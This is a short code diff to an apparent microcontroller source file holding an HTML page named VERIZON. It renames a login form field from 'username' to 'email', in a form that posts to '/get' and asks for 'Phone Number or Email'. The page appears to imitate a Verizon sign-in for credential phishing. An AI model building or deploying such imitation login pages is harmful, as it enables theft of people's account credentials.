@@ -168,7 +168,7 @@ const char VERIZON[] PROGMEM = R"rawliteral(
         <form action="/get" id="email-form-step">
             <div class="input-group">
                 <input
-                    name="username"
+                    name="email"
                     type="text"
                     class="form-input"
                     placeholder="Phone Number or Email"
